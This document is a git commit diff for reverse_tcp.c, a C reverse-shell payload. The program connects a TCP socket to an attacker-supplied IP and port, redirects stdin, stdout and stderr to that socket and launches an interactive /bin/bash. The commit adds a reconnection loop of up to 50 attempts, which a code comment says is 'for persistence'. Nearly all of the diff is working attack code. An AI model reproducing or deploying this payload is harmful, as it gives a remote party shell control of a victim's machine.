4856a217fc1b05204dab127e71525fa54ddc6554
its-mr-monday <67336200+its-mr-monday@users.noreply.github.com>
2021-05-23 14:43:08 -0400

    Update reverse_tcp.c

--- reverse_tcp.c
+++ reverse_tcp.c
@@ -18,15 +18,39 @@
 #include <ctype.h>
 
 #define DELIM "."
+#define MAX_ATTEMPTS 50
 
-bool is_valid_port(char *port){
-    if (isdigit(*port)){
-        int z = (int)(*port);
-        if (z > 0 && z < 65556){
+bool is_valid_port(char *port)
+{
+    if (isdigit(*port))
+    {
+        int z;
+        sscanf(port, "%d", &z);
+        if (z > 0 && z < 65556)
+        {
             return true;
         }
     }
     return false;
+}
+
+int connectSocket(int port, char *ip)
+{
+    struct sockaddr_in sa;
+    int s;
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(ip);
+    sa.sin_port = htons(port);
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    execl("/bin/bash", "-i", NULL);
+    return 0;
 }
 
 int main(int argc, char *argv[])
@@ -43,34 +67,23 @@ int main(int argc, char *argv[])
     int is_valid_ip = 1;
     if (is_valid_port(portContender) == true)
     {
-
-            int port = (int)(portContender);
-            char *ip = ipContender;
-
-                struct sockaddr_in revsockaddr;
-
-                int sockt = socket(AF_INET, SOCK_STREAM, 0);
-                revsockaddr.sin_family = AF_INET;       
-                revsockaddr.sin_port = htons(port);
-                revsockaddr.sin_addr.s_addr = inet_addr(ip);
-
-                connect(sockt, (struct sockaddr *) &revsockaddr, 
-                sizeof(revsockaddr));
-                dup2(sockt, 0);
-                dup2(sockt, 1);
-                dup2(sockt, 2);
-
-                char * const argv[] = {"/bin/bash", NULL};
-                execve("/bin/bash", argv, NULL);
-
-                return 0;         
+        int callbacks = 0;
+        int port;
+        sscanf(portContender, "%d", &port);
+        char *ip = ipContender;
+        //Inifinite reconnection loop *for persistence in case of error*
+        while (callbacks < MAX_ATTEMPTS)
+        {
+            connectSocket(port, ip);
+            printf("Retrying in 5s . . .");
+            sleep(5);
+            callbacks += 1;
+        }      
     }
     else
     {
-            printf("Invalid port for payload");
+            printf("Invalid port for payload . . .");
             return 0;
     }
-    
-     
-    
+    return 0;
 }
